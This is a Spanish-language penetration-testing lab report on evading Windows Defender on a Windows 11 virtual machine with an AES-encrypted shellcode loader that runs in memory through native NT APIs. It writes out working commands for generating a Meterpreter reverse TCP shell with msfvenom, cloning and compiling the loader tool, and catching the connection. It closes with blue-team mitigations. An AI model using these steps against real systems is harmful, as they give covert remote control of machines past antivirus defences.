# 📄 Reporte de Laboratorio: Creación de Payload Ofuscado y Evasión de Defensas en Windows

**Autor:** Juan José Acevedo (J2A2SEC)  
**Fecha:** 16 de Octubre de 2026  
**Entorno:** Kali Linux (Atacante) / Windows 11 (Víctima)  
**Objetivo:** Demostrar técnicas modernas de evasión de antivirus (Windows Defender) mediante el cifrado de payloads y ejecución en memoria, analizando las limitaciones de los mecanismos de protección modernos de Windows.

---

## 1. Introducción y Marco Teórico

El paradigma de la ciberseguridad ofensiva ha cambiado. Los antivirus tradicionales basados en firmas estáticas (como la codificación simple con `msfvenom -e`) son obsoletos. Windows Defender actual utiliza análisis heurístico, emulación y monitoreo de comportamiento (EDR).

Para evadir estas defensas, este laboratorio implementó una estrategia de **Ejecución en Memoria (Fileless Malware)**. El objetivo es que el código malicioso nunca toque el disco duro en texto plano. Para ello, se utilizó el proyecto `ShellcodeRunner (AES)`, el cual:

1. Cifra el shellcode original usando **AES-128**.
    
2. Utiliza un "Loader" (cargador) en C++ que descifra el payload **solo en la memoria RAM**.
    
3. Ejecuta las llamadas al sistema utilizando **APIs Nativas (NTAPI)** en lugar de las APIs comunes de Win32 (`VirtualAlloc`, `CreateThread`), evadiendo los "hooks" (ganchos) que pone el antivirus.
    

---

## 2. Desarrollo de la Práctica (Paso a Paso)

### Fase 1: Preparación del Entorno Atacante (Kali Linux)

Se instalaron las dependencias necesarias para compilar código de Windows en Linux y ejecutar el script de cifrado.

bash

```
sudo apt update && sudo apt install -y python3 python3-pip mingw-w64
python3 -m venv venv
source venv/bin/activate
pip install pycryptodome
```

### Fase 2: Generación del Shellcode

Se generó un shellcode crudo (raw) con Metasploit. Se utilizó una reverse shell estándar para probar la conexión.

bash

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_KALI> LPORT=4444 -f raw -o payload.bin

### Fase 3: Cifrado y Compilación del Loader

Se clonó la herramienta `ShellcodeRunner` y se ejecutó el script para cifrar el archivo `payload.bin` y compilarlo en un ejecutable de Windows.

bash

git clone https://github.com/jaytiwari05/shellcoderunner.git
cd shellcoderunner
python3 shellcoderunneraes.py payload.bin --aes MiClaveSecreta123 --compile

_Resultado:_ Se obtuvo el archivo **`runner.exe`**, el cual contiene el payload cifrado y el loader NTAPI.

### Fase 4: Prueba de Concepto en Windows 11 (Víctima)

1. Se transfirió `runner.exe` a la máquina virtual de Windows 11.
    
2. Se configuró el Listener en Metasploit en Kali Linux (`exploit/multi/handler`).
    
3. **Primer Intento (Bloqueo por Smart App Control):** Al intentar ejecutar el archivo, Windows 11 bloqueó la aplicación mediante el _Control Inteligente de Aplicaciones_, el cual impide la ejecución de binarios sin firma digital o reputación en la nube. _(Nota: Este no es el antivirus, sino un guardián de aplicaciones)._
    
4. **Solución:** Se desactivó temporalmente el Control Inteligente de Aplicaciones desde la Seguridad de Windows, al ser una máquina virtual de laboratorio.
    
5. **Segundo Intento (Ejecución Exitosa):** Se ejecutó `runner.exe`. El loader descifró el payload en memoria y se estableció la conexión con Metasploit en Kali Linux.
    

---

## 3. Análisis de Resultados y Conclusiones

- **Evasión Estática Exitosa:** El archivo `runner.exe` pasó el escaneo estático de Windows Defender. Esto demuestra que el cifrado AES es efectivo para ocultar la firma del shellcode de Meterpreter en el disco.
    
- **Limitación del Smart App Control:** Se aprendió que Windows 11 incluye capas de seguridad _Zero Trust_ (como Smart App Control) que bloquean binarios desconocidos independientemente de si son maliciosos o no. Para pruebas de pentesting, esto requiere el uso de certificados de firma EV o el uso de técnicas de _Living off the Land_ (LOLBins).
    
- **El comportamiento es el nuevo rey:** Si bien el archivo pasó desapercibido en disco, si el payload se hubiera ejecutado sin excepciones, el motor heurístico (EDR) de Defender podría haber detectado la inyección de memoria o la conexión de red saliente hacia Kali.
    

## 4. Recomendaciones de Mitigación (Blue Team)

Para proteger una infraestructura real contra este tipo de ataques, se recomienda:

1. **Habilitar Credential Guard y LSA Protection** para evitar el robo de hashes.
    
2. Mantener **Smart App Control** activo en modo bloqueo en entornos corporativos para detener ejecutables sin firmar.
    
3. Implementar soluciones **EDR** (Endpoint Detection and Response) avanzadas que analicen el comportamiento en memoria y las llamadas a la API NT.
    
4. Utilizar reglas de Firewall estrictas para bloquear conexiones salientes no autorizadas (bloquear puertos como el 4444).